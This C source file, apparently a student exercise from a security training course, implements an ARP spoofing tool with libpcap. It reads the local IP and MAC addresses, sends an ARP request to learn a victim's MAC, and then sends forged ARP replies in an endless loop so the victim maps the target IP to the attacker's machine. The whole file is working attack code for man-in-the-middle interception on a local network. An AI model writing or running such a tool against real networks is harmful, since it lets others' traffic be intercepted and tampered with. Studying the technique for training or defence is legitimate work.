#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include "gilgil.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <iostream>
#include <netinet/in.h>
#include <sys/ioctl.h>

#define ETH_Size 14
#define ARP_Size 28

void usage() {
    printf("syntax: pcap_test <interface>\n");
    printf("sample: pcap_test wlan0\n");
}

using namespace std;


void GetMyIp(char * dev, uint8_t * Ban_Ip)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);
    memcpy(Ban_Ip, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);
}

void GetMyMac(char * dev, uint8_t * Ban_Mac){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { }

    ifreq* it = ifc.ifc_req;
    const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
        {
            if (! (ifr.ifr_flags & IFF_LOOPBACK))
            {
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                {
                    success = true;
                    break;
                }
            }
        }
        else {}
    }
    if (success) memcpy(Ban_Mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    char track[] = "consulting";
    char name[] = "ban_soo_hwan";
    printf("[bob8][%s]arp_test[%s]\n", track, name);
    const u_char * ARP_Req = (u_char*)malloc(sizeof(u_char)*(ETH_Size+ARP_Size));
    gilethernet * Eth_Req = (gilethernet *)ARP_Req;
    gilarp * Arp_Req = (gilarp *)(ARP_Req + ETH_Size);
    char * Get_Sender_IP = argv[2];
    char * Get_Target_IP = argv[3];
    uint8_t Ban_Mac[6];
    uint8_t Ban_Ip[4];
    uint8_t Sender_Mac[6];
    uint8_t Sender_Ip[4];
    uint8_t Target_Ip[4];
    inet_pton(AF_INET, Get_Sender_IP, Sender_Ip);
    inet_pton(AF_INET, Get_Target_IP, Target_Ip);
    GetMyIp(dev,Ban_Ip);
    GetMyMac(dev,Ban_Mac);


    printf("Broadcasting........\n");
    for(int i=0; i<6; i++)
        Eth_Req->dmac[i]=0xFF;
    memcpy(Eth_Req->smac, Ban_Mac,6);
    Eth_Req->type = htons(0x0806); // Type = ARP
    Arp_Req->Htype = htons(0x0001); // Ethernet
    Arp_Req->Ptype = htons(0x0800); // IPv4
    Arp_Req->Hsize = 0x06; //Hardware Size
    Arp_Req->Psize = 0x04; //Protocol Size
    Arp_Req->OPcode = htons(0x0001); //OP = 0001 = request
    memcpy(Arp_Req->Smac, Ban_Mac, 6);
    memcpy(Arp_Req->Sip, Ban_Ip, 4);
    for(int i=0; i<6; i++)
        Arp_Req->Dmac[i]= 0x00;
    memcpy(Arp_Req->Dip, Sender_Ip, 4);


    while(1){
        struct pcap_pkthdr * rep_header;
        const u_char * rep_packet;
        printf("sending ARP request packet.....\n");
        pcap_sendpacket(handle, ARP_Req, ETH_Size+ARP_Size);
        int res = pcap_next_ex(handle, &rep_header, &rep_packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;
        gilethernet * get_mac = (gilethernet *)rep_packet;
        if(ntohs(get_mac->type) != 0x0806){
            continue;
        }
        if(memcmp(get_mac->dmac, Ban_Mac, 6)){
            continue;
        }
        gilarp * get_arp = (gilarp *)(rep_packet+ETH_Size);
        if((ntohs(get_arp->OPcode) != 0x0002)){ //check reply
            continue;
        }
        if(memcmp(get_arp->Sip, Sender_Ip, 4)){
            continue;
        }
        memcpy(Sender_Mac, get_mac->smac, 6);
        printf("!!!!!!!copying the mac completed!!!!!!!\n");
        printf("sender mac : %02x:%02x:%02x:%02x:%02x:%02x\n", Sender_Mac[0],Sender_Mac[1],Sender_Mac[2],Sender_Mac[3],
                Sender_Mac[4],Sender_Mac[5]);
        break;

    }
    const u_char * Overwrite_Packet = (u_char*)malloc(sizeof(u_char)*(ETH_Size+ARP_Size));
    gilethernet * Overwrite_Eth = (gilethernet *)Overwrite_Packet;
    gilarp * Overwrite_arp = (gilarp *)(Overwrite_Packet+ETH_Size);
    memcpy(Overwrite_Eth->dmac, Sender_Mac, 6);
    memcpy(Overwrite_Eth->smac, Ban_Mac, 6);
    Overwrite_Eth->type = htons(0x0806); //Type = ARP
    Overwrite_arp->Htype = htons(0x0001); //Ethernet
    Overwrite_arp->Ptype = htons(0x0800); //IPv4
    Overwrite_arp->Hsize = 0x06; //Hardware size
    Overwrite_arp->Psize = 0x04; //Protocol size
    Overwrite_arp->OPcode = htons(0x0002); // reply
    memcpy(Overwrite_arp->Smac, Ban_Mac, 6);
    memcpy(Overwrite_arp->Sip, Target_Ip, 4);
    memcpy(Overwrite_arp->Dmac, Sender_Mac, 6);
    memcpy(Overwrite_arp->Dip, Sender_Ip, 4);
    while(1){
        printf("sending arp reply.....\n");
        pcap_sendpacket(handle, Overwrite_Packet, ETH_Size+ARP_Size);
        sleep(1);

    }
    pcap_close(handle);
    return 0;
}
